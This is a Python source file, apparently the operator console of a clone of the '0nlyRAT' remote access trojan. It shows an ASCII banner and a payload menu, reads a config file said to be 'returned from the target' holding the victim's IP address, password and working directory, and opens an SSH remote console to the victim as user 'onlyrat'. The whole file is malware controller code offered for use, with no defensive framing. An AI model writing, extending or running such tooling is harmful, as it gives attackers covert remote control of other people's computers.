#!/usr/bin/python
# python console for the RAT to interact with target pc

import os
import sys
import getpass
from modules import *

banner = r"""
  /$$$$$$            /$$           /$$$$$$$   /$$$$$$  /$$$$$$$$
 /$$$_  $$          | $$          | $$__  $$ /$$__  $$|__  $$__/
| $$$$\ $$ /$$$$$$$ | $$ /$$   /$$| $$  \ $$| $$  \ $$   | $$   
| $$ $$ $$| $$__  $$| $$| $$  | $$| $$$$$$$/| $$$$$$$$   | $$   
| $$\ $$$$| $$  \ $$| $$| $$  | $$| $$__  $$| $$__  $$   | $$   
| $$ \ $$$| $$  | $$| $$| $$  | $$| $$  \ $$| $$  | $$   | $$   
|  $$$$$$/| $$  | $$| $$|  $$$$$$$| $$  | $$| $$  | $$   | $$   
 \______/ |__/  |__/|__/ \____  $$|__/  |__/|__/  |__/   |__/   
                         /$$  | $$                              
                        |  $$$$$$/                              
                         \______/                               
 
                
            [::] The Famous 0nlyRAT Clone Project :) [::]
"""

help_menu = """
        [::] 0nlyRAT help menu [::]
        
        Arguments: 
        -f  <config file>   = place the config file name with extension returned from the target

        Example:
        python3 main.py -f <config file>
"""

options_menu = """
            [*] Select Payload (0...) [*]

            Payloads:
                [0] Remote Console
"""

username = getpass.getuser()
header = f"{username}@onlyrat $ "
IPADDRESS = "IPADDRESS"
PASSWORD = "PASSWORD"
WORKINGDIR = "WORKINGDIR"

def read_config(config_file):
    if not os.path.exists(config_file):
        print(f"Error: Config file '{config_file}' does not exist.")
        sys.exit(1)
    configuration = {}
    read_lines = open(config_file, "r").readlines()
    configuration[IPADDRESS] = read_lines[0].strip()
    configuration[PASSWORD] = read_lines[1].strip()
    configuration[WORKINGDIR] = read_lines[2].strip()
    return configuration

# connect RAT to target
def connect():
    if sys.argv[1] == "-f":
        configuration = read_config(sys.argv[2])
        ipv4 = configuration.get(IPADDRESS)
        password = configuration.get(PASSWORD)
        wd = configuration.get(WORKINGDIR)
        os.system(f"ssh -p {password} onlyrat@{ipv4}")


def os_detection():
    if os.name == "nt":
        return "w"
    if os.name == "posix":
        return "l"

# command line interface
def cli(arguments):
    print(banner)
    if arguments:
        print(options_menu)
        option = input(f"{header}")
        if option == "0":
            connect()

    else:
        print(help_menu)

def main():
    # checks for arguments
    try:
        sys.argv[1]
        sys.argv[2]
        if sys.argv[1] != "-f":
            raise Exception
    except IndexError:
        arguments_exist = False
    except Exception:
        arguments_exist = False
    else:
        arguments_exist = True
    # run commandline interface
    cli(arguments_exist)

if __name__ == "__main__":
    main()